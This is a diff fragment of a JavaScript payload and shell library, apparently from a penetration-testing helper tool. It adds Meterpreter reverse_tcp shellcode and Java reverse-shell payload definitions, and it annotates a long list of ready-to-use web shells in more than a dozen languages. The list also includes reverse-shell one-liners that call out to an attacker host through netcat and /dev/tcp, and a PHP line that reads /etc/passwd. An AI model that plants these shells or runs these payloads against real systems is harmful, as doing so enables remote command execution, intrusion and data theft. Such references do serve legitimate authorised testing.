+    payload: 'java/shell_reverse_tcp',
+    format: 'war',
+    extension: 'war',
+    defaultName: 'payload'
+  },
+
+  // =========================
+  // Shellcode
+  // =========================
+  {
+    key: 'shellcode_c',
+    label: 'Shellcode (C)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'c',
+    extension: 'c',
+    defaultName: 'shellcode'
+  },
+  {
+    key: 'shellcode_python',
+    label: 'Shellcode (Python)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'python',
+    extension: 'py',
+    defaultName: 'shellcode'
+  },
+  {
+    key: 'shellcode_raw',
+    label: 'Shellcode (Raw)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'raw',
+    extension: 'bin',
+    defaultName: 'shellcode'
+  }
 ];
 
 const SHELL_LIBRARY = [{
@@ -4211,114 +4556,152 @@ const SHELL_LIBRARY = [{
         entries: [{
                 name: 'PHP',
                 commands: [
+                    '# Basic system() GET param execution',
                     '<?php system($_GET[\'cmd\']); ?>',
+                    '# passthru() for raw output',
                     '<?php echo passthru($_GET[\'cmd\']); ?>',
+                    '# shell_exec() with GET param',
                     '<?php echo shell_exec($_GET[\'cmd\']); ?>',
+                    '# exec() with GET param',
                     '<?php echo exec($_GET[\'cmd\']); ?>',
+                    '# Backtick operator execution',
                     '<?php echo `$_GET[\'cmd\']`; ?>',
+                    '# eval() POST param',
                     '<?php eval($_POST[\'cmd\']); ?>',
+                    '# eval() REQUEST param (suppressed errors)',
                     '<?php @eval($_REQUEST[\'cmd\']); ?>',
+                    '# File read test (useful for LFI checks)',
                     '<?php echo file_get_contents(\'/etc/passwd\'); ?>',
+                    '# Short tag with numeric index',
                     '<?=`$_GET[0]`?>',
-                    '<?=$_GET[0]($_GET[1]);?>'
+                    '# Function call via GET index',
+                    '<?=$_GET[0]($_GET[1]);?>',
                 ]
             },
             {
                 name: 'ASP',
                 commands: [
+                    '# VBScript eval via cmd parameter',
                     '<% eval request("cmd") %>',
+                    '# Execute cmd parameter',
                     '<% execute request("cmd") %>',
-                    '<% response.write(eval(request("cmd"))) %>'
+                    '# Return output from eval(cmd)',
+                    '<% response.write(eval(request("cmd"))) %>',
                 ]
             },
             {
                 name: 'ASPX',
                 commands: [
+                    '# C# ProcessStartInfo with cmd.exe',
                     '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]).Start());%>',
+                    '# VB WScript.Shell Run',
                     '<%@ Page Language="VB" %><%CreateObject("WScript.Shell").Run(Request("cmd"))%>',
-                    '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>'
+                    '# C# Process.Start with QueryString',
+                    '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>',
                 ]
             },
             {
                 name: 'JSP',
                 commands: [
+                    '# Runtime.exec with cmd parameter',
                     '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
+                    '# Exec with java.io import',
                     '<%@ page import="java.io.*" %><%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
-                    '<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os=p.getOutputStream();InputStream in=p.getInputStream();DataInputStream dis=new DataInputStream(in);String disr=dis.readLine();while(disr!=null){out.println(disr);disr=dis.readLine();}%>'
+                    '# Exec with output streaming',
+                    '<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os=p.getOutputStream();InputStream in=p.getInputStream();DataInputStream dis=new DataInputStream(in);String disr=dis.readLine();while(disr!=null){out.println(disr);disr=dis.readLine();}%>',
                 ]
             },
             {
                 name: 'Python (Flask)',
                 commands: [
+                    '# Flask os.popen GET cmd',
                     'from flask import Flask, request; import os; app = Flask(__name__); @app.route("/") def cmd(): return os.popen(request.args.get("cmd")).read(); app.run(host="0.0.0.0", port=8080)',
-                    'from flask import Flask, request; import subprocess; app = Flask(__name__); @app.route("/") def shell(): return subprocess.check_output(request.args.get("cmd"), shell=True).decode(); app.run(host="0.0.0.0")'
+                    '# Flask subprocess.check_output',
+                    'from flask import Flask, request; import subprocess; app = Flask(__name__); @app.route("/") def shell(): return subprocess.check_output(request.args.get("cmd"), shell=True).decode(); app.run(host="0.0.0.0")',
                 ]
             },
             {
                 name: 'Python (Django)',
                 commands: [
-                    'import os; from django.http import HttpResponse; def shell(request): return HttpResponse(os.popen(request.GET.get("cmd")).read())'
+                    '# Django HttpResponse + os.popen',
+                    'import os; from django.http import HttpResponse; def shell(request): return HttpResponse(os.popen(request.GET.get("cmd")).read())',
                 ]
             },
             {
                 name: 'Python (Generic)',
                 commands: [
+                    '# Busybox nc reverse shell',
                     'import os; os.system("busybox nc <LHOST> <LPORT> -e bash")',
+                    '# Netcat with /bin/bash',
                     'import subprocess; subprocess.call(["nc", "<LHOST>", "<LPORT>", "-e", "/bin/bash"])',
-                    '__import__("os").system("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")'
+                    '# Python one-liner reverse shell',
+                    '__import__("os").system("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")',
                 ]
             },
             {
                 name: 'Node.js (Express)',
                 commands: [
+                    '# Express + exec via query param',
                     'const express = require("express"); const { exec } = require("child_process"); const app = express(); app.get("/", (req, res) => { exec(req.query.cmd, (err, stdout) => { res.send(stdout); }); }); app.listen(8080);',
-                    'require("http").createServer((req,res)=>{require("child_process").exec(new URL(req.url,"http://localhost").searchParams.get("cmd"),(e,s)=>{res.end(s)})}).listen(8080)'
+                    '# Minimal HTTP server exec',
+                    'require("http").createServer((req,res)=>{require("child_process").exec(new URL(req.url,"http://localhost").searchParams.get("cmd"),(e,s)=>{res.end(s)})}).listen(8080)',
                 ]
             },
             {
                 name: 'Perl',
                 commands: [
+                    '# CGI eval via QUERY_STRING',
                     'use CGI qw(:standard); print header; print `$ENV{QUERY_STRING}`;',
-                    '#!/usr/bin/perl\nuse CGI; $q = CGI->new; print $q->header; print `@{[$q->param("cmd")]}`;'
+                    '# CGI param("cmd") execution',
+                    '#!/usr/bin/perl\\nuse CGI; $q = CGI->new; print $q->header; print `@{[$q->param("cmd")]}`;',
                 ]
             },
             {
                 name: 'Ruby',
                 commands: [
+                    '# Sinatra route with backticks',
                     'require "sinatra"; get "/" do; `#{params[:cmd]}`; end',
-                    '<% require "open3"; stdout, stderr, status = Open3.capture3(params[:cmd]); %><%= stdout %>'
+                    '# ERB Open3 capture3',
+                    '<% require "open3"; stdout, stderr, status = Open3.capture3(params[:cmd]); %><%= stdout %>',
                 ]
             },
             {
                 name: 'Go',
                 commands: [
-                    'package main; import ("net/http"; "os/exec"; "io"); func main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { cmd := exec.Command("sh", "-c", r.URL.Query().Get("cmd")); out, _ := cmd.Output(); io.WriteString(w, string(out)) }); http.ListenAndServe(":8080", nil) }'
+                    '# net/http exec handler',
+                    'package main; import ("net/http"; "os/exec"; "io"); func main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { cmd := exec.Command("sh", "-c", r.URL.Query().Get("cmd")); out, _ := cmd.Output(); io.WriteString(w, string(out)) }); http.ListenAndServe(":8080", nil) }',
                 ]
             },
             {
                 name: 'CFML (ColdFusion)',
                 commands: [
+                    '# Windows cmd.exe execution',
                     '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output"></cfexecute><cfoutput>#output#</cfoutput>',
-                    '<cfexecute name="/bin/bash" arguments="-c #url.cmd#" variable="result"></cfexecute><cfoutput>#result#</cfoutput>'
+                    '# Unix /bin/bash execution',
+                    '<cfexecute name="/bin/bash" arguments="-c #url.cmd#" variable="result"></cfexecute><cfoutput>#result#</cfoutput>',
                 ]
             },
             {
                 name: 'Lua',
                 commands: [
+                    '# ngx.var.arg_cmd with os.execute',
                     'os.execute(ngx.var.arg_cmd)',
-                    'local handle = io.popen(ngx.var.arg_cmd); local result = handle:read("*a"); handle:close(); ngx.say(result)'
+                    '# io.popen and ngx.say output',
+                    'local handle = io.popen(ngx.var.arg_cmd); local result = handle:read("*a"); handle:close(); ngx.say(result)',
                 ]
             },
             {
                 name: 'Bash (CGI)',
                 commands: [
-                    '#!/bin/bash\necho "Content-type: text/html"\necho ""\neval $QUERY_STRING'
+                    '# CGI bash eval via QUERY_STRING',
+                    '#!/bin/bash\\necho \"Content-type: text/html\"\\necho \"\"\\neval $QUERY_STRING',
                 ]
             },
             {
                 name: 'PowerShell (IIS)',
                 commands: [
-                    '<% @ Page Language="PowerShell" %><%Invoke-Expression $Request.QueryString["cmd"]%>'
+                    '# PowerShell Invoke-Expression from query param',
+                    '<% @ Page Language="PowerShell" %><%Invoke-Expression $Request.QueryString["cmd"]%>',
                 ]
             }
         ]
